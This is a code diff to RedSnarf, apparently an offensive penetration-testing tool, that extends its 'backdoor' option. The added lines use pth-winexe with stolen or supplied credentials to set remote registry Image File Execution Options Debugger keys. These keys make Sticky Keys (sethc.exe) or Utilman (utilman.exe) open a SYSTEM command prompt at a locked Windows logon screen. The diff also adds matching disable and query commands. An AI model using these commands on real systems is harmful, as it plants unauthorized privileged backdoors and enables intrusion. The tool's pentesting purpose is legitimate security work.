@@ -1679,7 +1679,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3m", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3n", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1738,7 +1738,7 @@ egroup.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default=
 # Registry related
 rgroup = p.add_argument_group('Registry related')
 rgroup.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery AutoLogon Registry Setting")
-rgroup.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Backdoor Registry Setting - Left Alt + Left Shift + Print Screen at Logon Screen")
+rgroup.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Backdoor Registry Setting")
 rgroup.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Smart Card scforceoption Registry Setting")
 rgroup.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
 rgroup.add_argument("-rM", "--edq_SingleSessionPerUser", dest="edq_SingleSessionPerUser", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP SingleSessionPerUser Registry Setting")
@@ -2840,25 +2840,53 @@ if edq_backdoor!='n':
 	if len(targets)==1:
 		try:
 			if edq_backdoor=='e':
-				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n\n",'red')
+				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n",'red')
 
-				print colored("[+]Enabling BACKDOOR:",'green')
-				print colored("[+]To use press Left Shift + Left Alt + Print Screen at a Locked Workstation:",'yellow')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
+				print colored("[+]BACKDOOR 1: Sticky Keys - Activate by pressing left shift multiple times at a Locked workstation",'green')
+				print colored("[+]BACKDOOR 2: Utilman - Activate with Windows Key + U at a Locked Workstation\n",'green')
+
+				response = raw_input("Which Backdoor would you like to set? (1,2): ")
+
+				if response =="1":
+					print colored("[+]Enabling BACKDOOR 1: Sticky Keys",'green')
+					print colored("[+]To use press left shift multiple times at a Locked Workstation:",'yellow')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
+					sys.exit()
+				elif response=="2":
+					print colored("[+]Enabling BACKDOOR 2: Utilman",'green')
+					print colored("[+]To use press Windows Key + U at a Locked Workstation:",'yellow')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\windows\system32\cmd.exe\" /f' 2>/dev/null")
+					sys.exit()
 				
-				sys.exit()	
+				sys.exit()
 
 			elif edq_backdoor=='d':
-				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n\n",'red')
+				print colored("\n[+]IMPORTANT - Remeber to remove when finished with\n",'red')
 
-				print colored("[+]Disabling BACKDOOR:",'green')
-				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"  /t REG_SZ /d \"\" /f' 2>/dev/null")
+				print colored("[+]BACKDOOR 1: Sticky Keys",'green')
+				print colored("[+]BACKDOOR 2: Utilman\n",'green')
+
+				response = raw_input("Which Backdoor would you like to disable? (1,2): ")
+
+				if response =="1":
+					print colored("[+]Disabling BACKDOOR 1: Sticky Keys",'green')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"  /t REG_SZ /d \"\" /f' 2>/dev/null")
+					sys.exit()
+				elif response=="2":
+					print colored("[+]Disabling BACKDOOR 2: Utilman",'green')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\" /t REG_SZ /d \"\" /f' 2>/dev/null")
+					sys.exit()
 				
-				sys.exit()	
+				sys.exit()
 	
 			elif edq_backdoor=='q':
-				print colored("[+]Querying the status of Backdoor:",'green')
+				print colored("[+]Querying the status of Backdoors:",'green')
+
+				print colored("[+]BACKDOOR 1: Sticky Keys Status",'green')
 				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v \"Debugger\"' 2>/dev/null")
+
+				print colored("[+]BACKDOOR 2: Utilman Status",'green')
+				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\" /v \"Debugger\"' 2>/dev/null")
 
 				sys.exit()	
 		except OSError:
